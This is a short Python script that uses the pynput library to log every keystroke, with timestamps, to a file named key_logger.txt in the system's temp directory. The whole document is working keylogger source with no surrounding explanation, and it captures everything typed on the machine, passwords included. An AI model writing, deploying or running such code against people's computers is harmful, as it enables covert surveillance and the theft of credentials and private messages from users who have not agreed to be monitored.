import tempfile
import logging
from pynput.keyboard import Key, Listener

print("Temp dir loc --> ", tempfile.gettempdir())

log_loc = tempfile.gettempdir()
log_file = "\key_logger.txt"
logging.basicConfig(filename=(log_loc + log_file), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_presses(key):
    logging.info(str(key))

with Listener(on_press=key_presses) as listener:
    listener.join()




